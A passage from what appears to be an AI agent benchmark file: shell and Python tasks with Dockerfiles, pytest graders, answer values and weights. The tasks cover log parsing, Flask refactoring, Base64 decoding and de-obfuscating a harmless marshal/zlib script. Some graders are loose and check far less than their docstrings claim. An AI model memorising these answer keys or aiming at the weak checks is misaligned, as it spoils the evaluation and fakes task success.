    # Various formats of killed/memory limit messages across platforms
    memory_error_indicators = [
        ""killed"",
        ""memory limit exceeded"",
        ""out of memory"",
        ""cannot allocate memory"",
        ""virtual memory exhausted"",
        ""memory exhausted"",
        ""memoryerror""
    ]
    
    # Also check for specific exit codes that indicate memory issues
    memory_exit_codes = [137, 139, 1]  # SIGKILL, SIGSEGV, general error
    
    # Test passes if we find memory error indicators OR specific exit codes
    has_memory_error_message = any(indicator in combined_output for indicator in memory_error_indicators)
    has_memory_exit_code = result.returncode in memory_exit_codes
    
    assert has_memory_error_message or has_memory_exit_code","{""test_script_created_with_ulimit"": 0.3, ""test_memory_limit_enforced"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
extract-unique-ip-addresses-log-file,medium,Extract IP Addresses from a Log File,Text Processing with CLI Tools,"I have a log file at `/var/log/auth.log` that contains many IP addresses scattered throughout it. I need you to extract all the unique IP addresses from this file and save them to a new file at `/app/unique_ips.txt`, with each unique IP address on its own line. Can you help me get this list of unique IPs?",file-operations,cli|text-processing|data-extraction|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN mkdir -p /app

RUN echo -e ""Jan 15 10:30:15 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2\nJan 15 10:30:20 server sshd[1235]: Failed password for admin from 10.0.0.50 port 22 ssh2\nJan 15 10:30:25 server sshd[1236]: Accepted password for user from 172.16.0.25 port 22 ssh2\nJan 15 10:30:30 server sshd[1237]: Failed password for guest from 203.0.113.45 port 22 ssh2"" > /var/log/auth.log

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess

def test_uses_pipeline_commands():
    """"""The agent uses a pipeline of commands, likely including `grep` (with a regex for IPs), `sort`, and `uniq`.""""""
    # Check that the output file exists (indicating commands were run)
    assert os.path.exists('/app/unique_ips.txt')
    
    # Read the output file
    with open('/app/unique_ips.txt', 'r') as f:
        lines = f.read().strip().split('\n')
    
    # Check that the IPs are unique (no duplicates)
    unique_lines = list(set(lines))
    assert len(lines) == len(unique_lines), ""Output should contain unique IPs only""
    
    # Check that all lines are valid IP addresses (basic validation)
    import re
    ip_pattern = r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
    for line in lines:
        if line.strip():
            assert re.match(ip_pattern, line.strip()), f""Invalid IP format: {line}""
    
    # Check that we have the expected number of unique IPs
    assert len(lines) == 4, ""Should have exactly 4 unique IP addresses""

def test_output_file_correct():
    """"""The file `/app/unique_ips.txt` is created and contains the correct list of unique IP addresses from the log.""""""
    # Check that the output file exists
    assert os.path.exists('/app/unique_ips.txt')
    
    # Read the output file
    with open('/app/unique_ips.txt', 'r') as f:
        content = f.read().strip()
    
    # Expected unique IP addresses from the log
    expected_ips = {'192.168.1.100', '10.0.0.50', '172.16.0.25', '203.0.113.45'}
    
    # Get actual IPs from the file
    actual_ips = set(line.strip() for line in content.split('\n') if line.strip())
    
    # Check that we have the correct unique IP addresses
    assert actual_ips == expected_ips
    assert len(actual_ips) == 4","{""test_uses_pipeline_commands"": 0.4, ""test_output_file_correct"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
log-file-csv-conversion,hard,Reformat a Log File into CSV,Text Processing with CLI Tools,"I have a custom log file located at `/app/app.log` that contains entries formatted like this: `2023-10-27 10:30:00 INFO User admin logged in from 192.168.1.100`. I need you to help me convert this log data into a CSV format. Could you process this file and create a new CSV file at `/app/report.csv` with four columns: `Timestamp`, `LogLevel`, `User`, and `IP`? I want to extract the relevant information from each log line and organize it properly in the CSV structure.",file-operations,cli|text-processing|data-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN echo ""2023-10-27 10:30:00 INFO User admin logged in from 192.168.1.100"" > /app/app.log && \
    echo ""2023-10-27 10:31:15 DEBUG User john logged in from 192.168.1.101"" >> /app/app.log && \
    echo ""2023-10-27 10:32:30 WARNING User sarah logged in from 192.168.1.102"" >> /app/app.log && \
    echo ""2023-10-27 10:33:45 ERROR User mike logged in from 192.168.1.103"" >> /app/app.log && \
    echo ""2023-10-27 10:35:00 INFO User alice logged in from 192.168.1.104"" >> /app/app.log

CMD [""/bin/bash""]","import os
import subprocess

def test_uses_text_processing_tools():
    """"""The agent uses powerful text processing tools like `sed` or `awk` to parse the lines.""""""
    # Check if the CSV file exists and has proper structure
    assert os.path.exists('/app/report.csv')
    
    # Read and validate the CSV content structure
    with open('/app/report.csv', 'r') as f:
        lines = f.readlines()
    
    # Should have proper CSV structure with headers and data
    assert len(lines) > 1
    
    # Check exact header format
    header = lines[0].strip()
    expected_headers = ['Timestamp', 'LogLevel', 'User', 'IP']
    actual_headers = [h.strip() for h in header.split(',')]
    assert actual_headers == expected_headers, f""Expected headers {expected_headers}, got {actual_headers}""
    
    # Check that all data rows have exactly 4 fields
    for line in lines[1:]:
        if line.strip():  # Skip empty lines
            fields = [f.strip() for f in line.split(',')]
            assert len(fields) == 4, f""Expected 4 fields, got {len(fields)} in line: {line.strip()}""

def test_csv_file_created_correctly():
    """"""The file `/app/report.csv` is created with the correct headers and data parsed accurately from the log file.""""""
    # Check if the CSV file exists
    assert os.path.exists('/app/report.csv')
    
    # Read and validate the CSV content
    with open('/app/report.csv', 'r') as f:
        lines = f.readlines()
    
    # Should have at least a header line and some data lines
    assert len(lines) > 1
    
    # Check exact header line
    header = lines[0].strip()
    assert header == 'Timestamp,LogLevel,User,IP', f""Expected 'Timestamp,LogLevel,User,IP', got '{header}'""
    
    # Verify we have exactly 5 data lines (based on the Dockerfile)
    data_lines = [line for line in lines[1:] if line.strip()]
    assert len(data_lines) == 5, f""Expected 5 data lines, got {len(data_lines)}""
    
    # Check that data is properly extracted from log entries
    expected_data = [
        ('2023-10-27 10:30:00', 'INFO', 'admin', '192.168.1.100'),
        ('2023-10-27 10:31:15', 'DEBUG', 'john', '192.168.1.101'),
        ('2023-10-27 10:32:30', 'WARNING', 'sarah', '192.168.1.102'),
        ('2023-10-27 10:33:45', 'ERROR', 'mike', '192.168.1.103'),
        ('2023-10-27 10:35:00', 'INFO', 'alice', '192.168.1.104')
    ]
    
    for i, line in enumerate(data_lines):
        fields = [f.strip() for f in line.strip().split(',')]
        assert len(fields) == 4, f""Line {i+1} should have 4 fields, got {len(fields)}""
        
        timestamp, loglevel, user, ip = fields
        expected_timestamp, expected_loglevel, expected_user, expected_ip = expected_data[i]
        
        assert timestamp == expected_timestamp, f""Line {i+1}: Expected timestamp '{expected_timestamp}', got '{timestamp}'""
        assert loglevel == expected_loglevel, f""Line {i+1}: Expected log level '{expected_loglevel}', got '{loglevel}'""
        assert user == expected_user, f""Line {i+1}: Expected user '{expected_user}', got '{user}'""
        assert ip == expected_ip, f""Line {i+1}: Expected IP '{expected_ip}', got '{ip}'""","{""test_uses_text_processing_tools"": 0.25, ""test_csv_file_created_correctly"": 0.75}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
unit-test-palindrome-function,easy,Add a Unit Test,Codebase Contribution Simulation,"I'm working on a Python project that's located in `/app/project`, and I have a utility function called `is_palindrome()` in the `project/utils.py` file. I need you to help me add a new unit test for this function in my `tests/test_utils.py` file. Specifically, I want to add a test case that verifies the function can correctly handle strings with mixed casing and punctuation - something like ""A man, a plan, a canal: Panama"". Can you write that test for me?",software-engineering,python|unit-testing|coding,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app/project

RUN mkdir -p tests

RUN touch tests/test_utils.py

RUN echo 'def is_palindrome(s):' > utils.py && \
    echo '    """"""Check if a string is a palindrome, ignoring case and non-alphanumeric characters.""""""' >> utils.py && \
    echo '    cleaned = """".join(char.lower() for char in s if char.isalnum())' >> utils.py && \
    echo '    return cleaned == cleaned[::-1]' >> utils.py

RUN pip install pytest

CMD [""/bin/bash""]","import os
import subprocess

def test_test_file_modified():
    """"""The file `tests/test_utils.py` is modified to include a new test function.""""""
    assert os.path.exists(""/app/project/tests/test_utils.py"")
    
    with open(""/app/project/tests/test_utils.py"", ""r"") as f:
        content = f.read()
    
    assert ""def test_"" in content

def test_pytest_passes_additional():
    """"""Running `pytest` from the `/app/project` directory now shows one more test passing than before.""""""
    result = subprocess.run(
        [""pytest"", ""-v""],
        cwd=""/app/project"",
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0
    assert ""1 passed"" in result.stdout","{""test_test_file_modified"": 0.3, ""test_pytest_passes_additional"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
refactor-json-response-helper-module,medium,Refactor Code to Use a New Module,Codebase Contribution Simulation,"I have a project located at `/app/webapp` where I'm manually constructing JSON responses across multiple files like `routes/user.py` and `routes/product.py`. This approach is getting really repetitive and I'd like you to help me refactor it. Could you create a new helper module at `webapp/helpers/response.py` that contains a function called `create_json_response(data, status_code)`? After that, I need you to update all the route files so they import and use this new function instead of manually building JSON responses each time.",software-engineering,software-engineering|coding|python|web|api,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app/webapp

RUN pip install flask

# Main Flask application
RUN echo ""from flask import Flask\nfrom routes.users import users_bp\nfrom routes.products import products_bp\nfrom routes.orders import orders_bp\n\napp = Flask(__name__)\napp.register_blueprint(users_bp)\napp.register_blueprint(products_bp)\napp.register_blueprint(orders_bp)\n\nif __name__ == '__main__':\n    app.run()"" > app.py

# Create routes directory
RUN mkdir -p routes

# Users route file with repeated JSON response logic
RUN echo ""from flask import Blueprint, jsonify\n\nusers_bp = Blueprint('users', __name__)\n\n@users_bp.route('/users')\ndef get_users():\n    data = {'users': ['user1', 'user2']}\n    response = {\n        'status': 'success',\n        'data': data,\n        'message': 'Retrieved successfully'\n    }\n    return jsonify(response)\n\n@users_bp.route('/users/<int:user_id>')\ndef get_user(user_id):\n    data = {'user': f'user{user_id}'}\n    response = {\n        'status': 'success',\n        'data': data,\n        'message': 'Retrieved successfully'\n    }\n    return jsonify(response)"" > routes/users.py

# Products route file with repeated JSON response logic
RUN echo ""from flask import Blueprint, jsonify\n\nproducts_bp = Blueprint('products', __name__)\n\n@products_bp.route('/products')\ndef get_products():\n    data = {'products': ['product1', 'product2']}\n    response = {\n        'status': 'success',\n        'data': data,\n        'message': 'Retrieved successfully'\n    }\n    return jsonify(response)\n\n@products_bp.route('/products/<int:product_id>')\ndef get_product(product_id):\n    data = {'product': f'product{product_id}'}\n    response = {\n        'status': 'success',\n        'data': data,\n        'message': 'Retrieved successfully'\n    }\n    return jsonify(response)"" > routes/products.py

# Orders route file with repeated JSON response logic
RUN echo ""from flask import Blueprint, jsonify\n\norders_bp = Blueprint('orders', __name__)\n\n@orders_bp.route('/orders')\ndef get_orders():\n    data = {'orders': ['order1', 'order2']}\n    response = {\n        'status': 'success',\n        'data': data,\n        'message': 'Retrieved successfully'\n    }\n    return jsonify(response)\n\n@orders_bp.route('/orders/<int:order_id>')\ndef get_order(order_id):\n    data = {'order': f'order{order_id}'}\n    response = {\n        'status': 'success',\n        'data': data,\n        'message': 'Retrieved successfully'\n    }\n    return jsonify(response)"" > routes/orders.py

CMD [""/bin/bash""]","import os
import subprocess
import ast

def test_helper_module_created():
    """"""The new module `webapp/helpers/response.py` is created with the specified function.""""""
    # Check if the helpers directory and file exist
    helpers_dir = ""/app/webapp/helpers""
    response_file = ""/app/webapp/helpers/response.py""
    
    assert os.path.exists(helpers_dir), ""helpers directory does not exist""
    assert os.path.exists(response_file), ""response.py file does not exist""
    
    # Check if the file contains the create_json_response function
    with open(response_file, 'r') as f:
        content = f.read()
    
    # Parse the Python file to check for the function
    try:
        tree = ast.parse(content)
        function_found = False
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef) and node.name == 'create_json_response':
                # Check if it has the expected parameters
                args = [arg.arg for arg in node.args.args]
                assert 'data' in args and 'status_code' in args, ""Function parameters are incorrect""
                function_found = True
                break
        assert function_found, ""create_json_response function not found""
    except SyntaxError:
        assert False, ""response.py contains syntax errors""

def test_view_files_refactored():
    """"""The existing view files are modified to import and use the new helper function.""""""
    view_files = [
        ""/app/webapp/routes/users.py"",
        ""/app/webapp/routes/products.py"", 
        ""/app/webapp/routes/orders.py""
    ]
    
    for file_path in view_files:
        assert os.path.exists(file_path), f""View file {file_path} does not exist""
        
        with open(file_path, 'r') as f:
            content = f.read()
        
        # Check if the file imports the helper function
        assert 'from helpers.response import create_json_response' in content or \
               'from webapp.helpers.response import create_json_response' in content or \
               'import helpers.response' in content or \
               'create_json_response' in content, f""Helper function not imported in {file_path}""
        
        # Check if the file uses the helper function instead of manual response construction
        assert 'create_json_response' in content, f""Helper function not used in {file_path}""

def test_unit_tests_pass():
    """"""The application's existing unit tests (which test the API endpoints) continue to pass, proving the refactor was successful.Total: 1.0""""""
    # Look for test files in common locations
    test_locations = [
        ""/app/webapp/tests"",
        ""/app/webapp/test"",
        ""/app/webapp""
    ]
    
    test_files = []
    for location in test_locations:
        if os.path.exists(location):
            for root, dirs, files in os.walk(location):
                for file in files:
                    if file.startswith('test_') and file.endswith('.py'):
                        test_files.append(os.path.join(root, file))
    
    # Also check for test files in the main directory
    for file in os.listdir(""/app/webapp""):
        if file.startswith('test_') and file.endswith('.py'):
            test_files.append(os.path.join(""/app/webapp"", file))
    
    if test_files:
        # Run the tests
        for test_file in test_files:
            result = subprocess.run(['python', test_file], 
                                  cwd='/app/webapp', 
                                  capture_output=True, 
                                  text=True)
            assert result.returncode == 0, f""Test file {test_file} failed: {result.stderr}""
    else:
        # If no test files found, check that the app can at least be imported without errors
        result = subprocess.run(['python', '-c', 'import app'], 
                              cwd='/app/webapp', 
                              capture_output=True, 
                              text=True)
        assert result.returncode == 0, f""Application failed to import: {result.stderr}""","{""test_helper_module_created"": 0.2, ""test_view_files_refactored"": 0.35, ""test_unit_tests_pass"": 0.45}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
feature-flag-beta-endpoint-implementation,hard,Implement a Feature Behind a Feature Flag,Codebase Contribution Simulation,"I need to add a new experimental feature to my application located at `/app/app`. The feature should only be active when an environment variable called `ENABLE_BETA_FEATURE` is set to `true`. What I want to implement is a new `/beta/status` endpoint for my Flask app. Could you please read through my main configuration file at `app/config.py` first to understand how I'm managing other settings, then implement the feature flag check there? After that, I'd like you to add the new endpoint in `app/routes.py` following the same patterns you see in my existing code.",software-engineering,software-engineering|api|web-server|coding,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install flask

RUN mkdir -p /app/app

# Create configuration file
RUN echo 'import os' > /app/app/config.py && \
    echo '' >> /app/app/config.py && \
    echo 'class Config:' >> /app/app/config.py && \
    echo '    SECRET_KEY = os.environ.get(""SECRET_KEY"") or ""dev-secret-key""' >> /app/app/config.py && \
    echo '    DATABASE_URL = os.environ.get(""DATABASE_URL"") or ""sqlite:///app.db""' >> /app/app/config.py && \
    echo '    DEBUG = True' >> /app/app/config.py && \
    echo '    TESTING = False' >> /app/app/config.py && \
    echo '' >> /app/app/config.py && \
    echo 'class ProductionConfig(Config):' >> /app/app/config.py && \
    echo '    DEBUG = False' >> /app/app/config.py && \
    echo '' >> /app/app/config.py && \
    echo 'class TestingConfig(Config):' >> /app/app/config.py && \
    echo '    TESTING = True' >> /app/app/config.py && \
    echo '    DATABASE_URL = ""sqlite:///:memory:""' >> /app/app/config.py

# Create models file
RUN echo 'from datetime import datetime' > /app/app/models.py && \
    echo '' >> /app/app/models.py && \
    echo 'class User:' >> /app/app/models.py && \
    echo '    def __init__(self, id, username, email):' >> /app/app/models.py && \
    echo '        self.id = id' >> /app/app/models.py && \
    echo '        self.username = username' >> /app/app/models.py && \
    echo '        self.email = email' >> /app/app/models.py && \
    echo '        self.created_at = datetime.utcnow()' >> /app/app/models.py && \
    echo '    ' >> /app/app/models.py && \
    echo '    def to_dict(self):' >> /app/app/models.py && \
    echo '        return {' >> /app/app/models.py && \
    echo '            ""id"": self.id,' >> /app/app/models.py && \
    echo '            ""username"": self.username,' >> /app/app/models.py && \
    echo '            ""email"": self.email,' >> /app/app/models.py && \
    echo '            ""created_at"": self.created_at.isoformat()' >> /app/app/models.py && \
    echo '        }' >> /app/app/models.py && \
    echo '' >> /app/app/models.py && \
    echo 'class Post:' >> /app/app/models.py && \
    echo '    def __init__(self, id, title, content, author_id):' >> /app/app/models.py && \
    echo '        self.id = id' >> /app/app/models.py && \
    echo '        self.title = title' >> /app/app/models.py && \
    echo '        self.content = content' >> /app/app/models.py && \
    echo '        self.author_id = author_id' >> /app/app/models.py && \
    echo '        self.created_at = datetime.utcnow()' >> /app/app/models.py && \
    echo '    ' >> /app/app/models.py && \
    echo '    def to_dict(self):' >> /app/app/models.py && \
    echo '        return {' >> /app/app/models.py && \
    echo '            ""id"": self.id,' >> /app/app/models.py && \
    echo '            ""title"": self.title,' >> /app/app/models.py && \
    echo '            ""content"": self.content,' >> /app/app/models.py && \
    echo '            ""author_id"": self.author_id,' >> /app/app/models.py && \
    echo '            ""created_at"": self.created_at.isoformat()' >> /app/app/models.py && \
    echo '        }' >> /app/app/models.py && \
    echo '' >> /app/app/models.py && \
    echo '# Simple in-memory storage' >> /app/app/models.py && \
    echo 'users_db = {}' >> /app/app/models.py && \
    echo 'posts_db = {}' >> /app/app/models.py && \
    echo 'user_counter = 1' >> /app/app/models.py && \
    echo 'post_counter = 1' >> /app/app/models.py

# Create routes file
RUN echo 'from flask import Blueprint, request, jsonify' > /app/app/routes.py && \
    echo 'from .models import User, Post, users_db, posts_db, user_counter, post_counter' >> /app/app/routes.py && \
    echo '' >> /app/app/routes.py && \
    echo 'api = Blueprint(""api"", __name__)' >> /app/app/routes.py && \
    echo '' >> /app/app/routes.py && \
    echo '@api.route(""/users"", methods=[""GET"", ""POST""])' >> /app/app/routes.py && \
    echo 'def users():' >> /app/app/routes.py && \
    echo '    global user_counter' >> /app/app/routes.py && \
    echo '    ' >> /app/app/routes.py && \
    echo '    if request.method == ""GET"":' >> /app/app/routes.py && \
    echo '        return jsonify([user.to_dict() for user in users_db.values()])' >> /app/app/routes.py && \
    echo '    ' >> /app/app/routes.py && \
    echo '    elif request.method == ""POST"":' >> /app/app/routes.py && \
    echo '        data = request.get_json()' >> /app/app/routes.py && \
    echo '        if not data or ""username"" not in data or ""email"" not in data:' >> /app/app/routes.py && \
    echo '            return jsonify({""error"": ""Username and email required""}), 400' >> /app/app/routes.py && \
    echo '        ' >> /app/app/routes.py && \
    echo '        user = User(user_counter, data[""username""], data[""email""])' >> /app/app/routes.py && \
    echo '        users_db[user_counter] = user' >> /app/app/routes.py && \
    echo '        user_counter += 1' >> /app/app/routes.py && \
    echo '        ' >> /app/app/routes.py && \
    echo '        return jsonify(user.to_dict()), 201' >> /app/app/routes.py && \
    echo '' >> /app/app/routes.py && \
    echo '@api.route(""/users/<int:user_id>"", methods=[""GET""])' >> /app/app/routes.py && \
    echo 'def get_user(user_id):' >> /app/app/routes.py && \
    echo '    user = users_db.get(user_id)' >> /app/app/routes.py && \
    echo '    if not user:' >> /app/app/routes.py && \
    echo '        return jsonify({""error"": ""User not found""}), 404' >> /app/app/routes.py && \
    echo '    return jsonify(user.to_dict())' >> /app/app/routes.py && \
    echo '' >> /app/app/routes.py && \
    echo '@api.route(""/posts"", methods=[""GET"", ""POST""])' >> /app/app/routes.py && \
    echo 'def posts():' >> /app/app/routes.py && \
    echo '    global post_counter' >> /app/app/routes.py && \
    echo '    ' >> /app/app/routes.py && \
    echo '    if request.method == ""GET"":' >> /app/app/routes.py && \
    echo '        return jsonify([post.to_dict() for post in posts_db.values()])' >> /app/app/routes.py && \
    echo '    ' >> /app/app/routes.py && \
    echo '    elif request.method == ""POST"":' >> /app/app/routes.py && \
    echo '        data = request.get_json()' >> /app/app/routes.py && \
    echo '        if not data or ""title"" not in data or ""content"" not in data or ""author_id"" not in data:' >> /app/app/routes.py && \
    echo '            return jsonify({""error"": ""Title, content and author_id required""}), 400' >> /app/app/routes.py && \
    echo '        ' >> /app/app/routes.py && \
    echo '        if data[""author_id""] not in users_db:' >> /app/app/routes.py && \
    echo '            return jsonify({""error"": ""Author not found""}), 400' >> /app/app/routes.py && \
    echo '        ' >> /app/app/routes.py && \
    echo '        post = Post(post_counter, data[""title""], data[""content""], data[""author_id""])' >> /app/app/routes.py && \
    echo '        posts_db[post_counter] = post' >> /app/app/routes.py && \
    echo '        post_counter += 1' >> /app/app/routes.py && \
    echo '        ' >> /app/app/routes.py && \
    echo '        return jsonify(post.to_dict()), 201' >> /app/app/routes.py && \
    echo '' >> /app/app/routes.py && \
    echo '@api.route(""/posts/<int:post_id>"", methods=[""GET""])' >> /app/app/routes.py && \
    echo 'def get_post(post_id):' >> /app/app/routes.py && \
    echo '    post = posts_db.get(post_id)' >> /app/app/routes.py && \
    echo '    if not post:' >> /app/app/routes.py && \
    echo '        return jsonify({""error"": ""Post not found""}), 404' >> /app/app/routes.py && \
    echo '    return jsonify(post.to_dict())' >> /app/app/routes.py

# Create main application file
RUN echo 'from flask import Flask' > /app/app/__init__.py && \
    echo 'from .config import Config' >> /app/app/__init__.py && \
    echo 'from .routes import api' >> /app/app/__init__.py && \
    echo '' >> /app/app/__init__.py && \
    echo 'def create_app(config_class=Config):' >> /app/app/__init__.py && \
    echo '    app = Flask(__name__)' >> /app/app/__init__.py && \
    echo '    app.config.from_object(config_class)' >> /app/app/__init__.py && \
    echo '    ' >> /app/app/__init__.py && \
    echo '    app.register_blueprint(api, url_prefix=""/api"")' >> /app/app/__init__.py && \
    echo '    ' >> /app/app/__init__.py && \
    echo '    @app.route(""/"")' >> /app/app/__init__.py && \
    echo '    def index():' >> /app/app/__init__.py && \
    echo '        return {' >> /app/app/__init__.py && \
    echo '            ""message"": ""Flask API Server"",' >> /app/app/__init__.py && \
    echo '            ""endpoints"": {' >> /app/app/__init__.py && \
    echo '                ""users"": ""/api/users"",' >> /app/app/__init__.py && \
    echo '                ""posts"": ""/api/posts""' >> /app/app/__init__.py && \
    echo '            }' >> /app/app/__init__.py && \
    echo '        }' >> /app/app/__init__.py && \
    echo '    ' >> /app/app/__init__.py && \
    echo '    @app.route(""/health"")' >> /app/app/__init__.py && \
    echo '    def health():' >> /app/app/__init__.py && \
    echo '        return {""status"": ""healthy""}' >> /app/app/__init__.py && \
    echo '    ' >> /app/app/__init__.py && \
    echo '    return app' >> /app/app/__init__.py && \
    echo '' >> /app/app/__init__.py && \
    echo 'app = create_app()' >> /app/app/__init__.py && \
    echo '' >> /app/app/__init__.py && \
    echo 'if __name__ == ""__main__"":' >> /app/app/__init__.py && \
    echo '    app.run(host=""0.0.0.0"", port=5000, debug=True)' >> /app/app/__init__.py

CMD [""/bin/bash""]","import os
import subprocess
import time
import signal

def test_config_reads_feature_flag():
    """"""The `app/config.py` file is modified to read the `ENABLE_BETA_FEATURE` environment variable.""""""
    config_path = ""/app/app/config.py""
    assert os.path.exists(config_path)
    
    with open(config_path, 'r') as f:
        content = f.read()
    
    # Check if the config file reads the ENABLE_BETA_FEATURE environment variable
    assert ""ENABLE_BETA_FEATURE"" in content
    assert ""os.environ.get"" in content and ""ENABLE_BETA_FEATURE"" in content

def test_routes_conditionally_adds_endpoint():
    """"""The `app/routes.py` file is modified to conditionally add the `/beta/status` endpoint based on the config.""""""
    routes_path = ""/app/app/routes.py""
    assert os.path.exists(routes_path)
    
    with open(routes_path, 'r') as f:
        content = f.read()
    
    # Check if routes file contains conditional logic for beta endpoint
    assert ""/beta/status"" in content
    # Check for conditional logic (if statement or similar)
    assert (""if"" in content and ""beta"" in content.lower()) or (""ENABLE_BETA_FEATURE"" in content)

def test_endpoint_returns_404_when_disabled():
    """"""When the app is run without the env var, a `curl` to `/beta/status` returns a 404.""""""
    # Start Flask app without the environment variable
    env = os.environ.copy()
    env.pop('ENABLE_BETA_FEATURE', None)  # Remove if it exists
    
    process = subprocess.Popen(
        ['python', '-m', 'app', '--port', '5001'],
        cwd='/app',
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    try:
        # Wait for server to start
        time.sleep(3)
        
        # Make request to beta endpoint
        result = subprocess.run(
            ['curl', '-s', '-w', '%{http_code}', 'http://localhost:5001/beta/status'],
            capture_output=True,
            text=True
        )
        
        # Check if 404 is returned
        assert '404' in result.stdout
        
    finally:
        process.terminate()
        process.wait()

def test_endpoint_returns_200_when_enabled():
    """"""When the app is run with `ENABLE_BETA_FEATURE=true`, a `curl` to `/beta/status` returns a 200 OK.""""""
    # Start Flask app with the environment variable set
    env = os.environ.copy()
    env['ENABLE_BETA_FEATURE'] = 'true'
    
    process = subprocess.Popen(
        ['python', '-m', 'app', '--port', '5002'],
        cwd='/app',
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    try:
        # Wait for server to start
        time.sleep(3)
        
        # Make request to beta endpoint
        result = subprocess.run(
            ['curl', '-s', '-w', '%{http_code}', 'http://localhost:5002/beta/status'],
            capture_output=True,
            text=True
        )
        
        # Check if 200 is returned
        assert '200' in result.stdout
        
    finally:
        process.terminate()
        process.wait()","{""test_config_reads_feature_flag"": 0.2, ""test_routes_conditionally_adds_endpoint"": 0.2, ""test_endpoint_returns_404_when_disabled"": 0.3, ""test_endpoint_returns_200_when_enabled"": 0.3}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
base64-decode-secret-message,easy,Decode a Base64-encoded String,Language & Binary Puzzles,"I have a file at `/app/secret.txt` that contains a secret message, but it's been encoded and I'm pretty sure it's Base64. Can you decode it for me and write the original message to `/app/decoded.txt`?",security,base64|cli|file-operations|decrypt,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /

RUN mkdir -p /app && \
    echo ""SGVsbG8gV29ybGQ="" > /app/secret.txt

CMD [""/bin/bash""]","import os
import subprocess

def test_decoded_file_correct():
    """"""The file `/app/decoded.txt` contains the correctly decoded message.""""""
    assert os.path.exists('/app/decoded.txt')
    with open('/app/decoded.txt', 'r') as f:
        content = f.read().strip()
    assert content == ""Hello World""","{""test_decoded_file_correct"": 1.0}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
reverse-obfuscated-python-script,medium,Reverse a Simple Obfuscated Python Script,Language & Binary Puzzles,"I have an obfuscated Python script located at `/app/mystery.py` that was created using `marshal` and `zlib`. I need you to de-obfuscate this file and save the original, human-readable source code to `/app/original_source.py`. Please create a deobfuscation script to help with this process, and then use it to reverse the obfuscation and get back the readable Python code.",security,python|security|debugging|file-operations|decrypt,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN python3 -c ""import marshal, zlib; code = compile('print(\""Hello, World!\"")\nfor i in range(5):\n    print(f\""Number: {i}\"")\nresult = sum([x**2 for x in range(10)])\nprint(f\""Sum of squares: {result}\"")', '<string>', 'exec'); compressed = zlib.compress(marshal.dumps(code)); print('import marshal, zlib; exec(marshal.loads(zlib.decompress(b\'' + repr(compressed)[2:-1] + '\')))')"" > mystery.py

CMD [""/bin/bash""]","import os
import subprocess
import glob

def test_deobfuscation_script_created():
    """"""The agent writes a helper script or uses the Python interpreter interactively to decompress and unmarshal the code object.""""""
    # Check for separate deobfuscation script first
    python_files = glob.glob(""/app/*.py"")
    
    found_deobfuscation_script = False
    for file_path in python_files:
        if file_path.endswith(""mystery.py"") or file_path.endswith(""original_source.py""):
            continue  # Skip the original obfuscated file and the target file
        
        try:
            with open(file_path, 'r') as f:
                content = f.read()
                # Check if this file contains deobfuscation logic
                if (""marshal.loads"" in content or ""marshal.load"" in content) and \
                   (""zlib.decompress"" in content):
                    found_deobfuscation_script = True
                    break
        except:
            continue
    
    # If no separate script found, assume interactive Python was used if deobfuscation was successful
    if not found_deobfuscation_script:
        # Check if original_source.py exists and appears to be deobfuscated content
        if os.path.exists(""/app/original_source.py""):
            found_deobfuscation_script = True
    
    assert found_deobfuscation_script

def test_original_source_file_created():
    """"""The file `/app/original_source.py` is created and contains the valid, original Python source code.Total: 1.0""""""
    # Check if the file exists
    assert os.path.exists(""/app/original_source.py"")
    
    # Check if it contains valid Python code by trying to compile it
    with open(""/app/original_source.py"", 'r') as f:
        content = f.read()
    
    # Verify the content is not empty and contains valid Python syntax
    assert len(content.strip()) > 0
    
    # Try to compile the code to check if it's valid Python
    try:
        compile(content, ""/app/original_source.py"", ""exec"")
        valid_python = True
    except SyntaxError:
        valid_python = False
    
    assert valid_python","{""test_deobfuscation_script_created"": 0.25, ""test_original_source_file_created"": 0.75}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
debugging-stripped-binary-analysis,hard,Identify and Run a Stripped Binary,Language & Binary Puzzles,"I found this mystery program at `/app/program` and I'm completely stumped. It's a stripped binary, so I have no idea what it does or how to run it properly. The program seems to expect some specific input and then produces an output, but I can't figure out what kind of input it needs. Could you help me figure out what this program requires, run it correctly, and capture whatever output it produces in `/app/output.txt`?",debugging,debugging|C|system|analysis|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y gcc && \
    mkdir -p /app && \
    echo '#include <stdio.h>\nint main() {\n    int a, b;\n    scanf(""%d %d"", &a, &b);\n    printf(""%d\\n"", a + b);\n    return 0;\n}' > /tmp/program.c && \
    gcc -o /app/program /tmp/program.c && \
    strip /app/program && \
    rm /tmp/program.c && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_binary_executed_with_inputs():
    """"""The binary was executed and produced output to /app/output.txt.""""""
